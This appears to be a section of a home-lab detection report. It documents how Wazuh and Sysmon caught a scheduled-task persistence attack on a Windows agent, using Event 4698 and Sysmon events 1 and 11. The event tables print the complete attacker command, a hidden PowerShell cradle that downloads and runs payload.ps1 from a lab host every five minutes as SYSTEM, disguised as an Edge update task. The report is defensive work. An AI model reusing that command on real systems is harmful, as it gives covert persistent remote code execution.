# 03 — Alert / Detection (actual events)

Three independent detection layers fired. Agent `winhome01` (192.168.100.108).

## 1. Windows Event ID 4698 — Scheduled Task Created (Security log) — the money shot

| Field | Value |
|---|---|
| `eventID` | **4698** — "A scheduled task was created." |
| `channel` | Security |
| `subjectUserName` / `subjectUserSid` | `DESKTOP-F0JVTQT$` / `S-1-5-18` (SYSTEM — created from psexec SYSTEM shell) |
| `subjectLogonId` | `0x3e7` |
| `taskName` | `\MicrosoftEdgeUpdateTask` |
| `taskContent` (XML) | Full task XML logged: URI `\MicrosoftEdgeUpdateTask`; Triggers: TimeTrigger, Interval **PT5M** (every 5 min); Settings: **Hidden=true**, AllowHardTerminate=true, ExecutionTimeLimit PT72H; Actions: Exec → Command `powershell.exe`, Arguments `-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')"`; Principals: UserId **SYSTEM**, RunLevel LeastPrivilege |
| `eventRecordID` | 3024 (sample) |
| Count | **2** 4698 events in Security log (create + re-register) |
📸 `evidence/07-wazuh-4698-task-created.png`, `evidence/12-windows-eventviewer-4698.png`

**Why it's critical:** the full malicious command line is embedded in the logged task XML — no ambiguity.

## 2. Sysmon Event ID 1 — Process Create (schtasks.exe)

| Field | Value |
|---|---|
| `eventID` | **1** |
| `image` | `C:\Windows\SysWOW64\schtasks.exe` (32-bit — suspicious) |
| `originalFileName` / `description` | schtasks.exe / "Task Scheduler Configuration Tool" |
| `parentImage` / `parentCommandLine` | `C:\Windows\SysWOW64\cmd.exe` / `cmd.exe` (psexec-spawned) |
| `commandLine` | `schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')\"" /sc minute /mo 5 /ru SYSTEM /f` |
| `user` / `integrityLevel` | `NT AUTHORITY\SYSTEM` / System |
| `processId` / `parentProcessId` | 6768 / 7816 |
| `hashes` | SHA1=A8EEA4CAB549C87F6BB90EB2AE4012037B8BD221; MD5=48C2FE20575769DE916F48EF0676A965; SHA256=910DBB011811BFA116422CA95202D8F5; IMPHASH captured |
| `ruleName` (Sysmon tag) | **technique_id=T1053.005, technique_name=Scheduled Task** (SwiftOnSecurity) |
| `utcTime` | 2026-10-28 12:47:48.989Z |
📸 `evidence/08-wazuh-sysmon-1-schtasks.png`

## 3. Sysmon Event ID 11 — File Create (task file written)

| Field | Value |
|---|---|
| `eventID` | **11** — "File created" |
| `targetFilename` | `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTask` |
| `image` (writer) | `C:\Windows\system32\svchost.exe` (Task Scheduler service — expected writer) |
| `user` | `NT AUTHORITY\SYSTEM` |
| `processId` | 1420 |
| `ruleName` (Sysmon tag) | **technique_id=T1053.005, technique_name=Scheduled Task** |
| `utcTime` | 2026-10-28 12:47:49.126Z |
| `eventRecordID` | 5214 |
📸 `evidence/09-wazuh-sysmon-11-task-file.png`

## Corroboration (Windows Event Viewer)

Security log → filter Event ID 4698 → **2 events** (5:35:14 and 5:47:49 local). Details panel shows subject SYSTEM (DESKTOP-F0JVTQT$, WORKGROUP), task name `\MicrosoftEdgeUpdateTask`, full task XML.
📸 `evidence/12-windows-eventviewer-4698.png`

## Detection gap note

Built-in Wazuh rules did not alert at high severity on the 4698 by default; detection required triage. Custom rule in `09-Remediation.md` (alert on 4698 with `powershell`/`IEX` in task content) closes this.
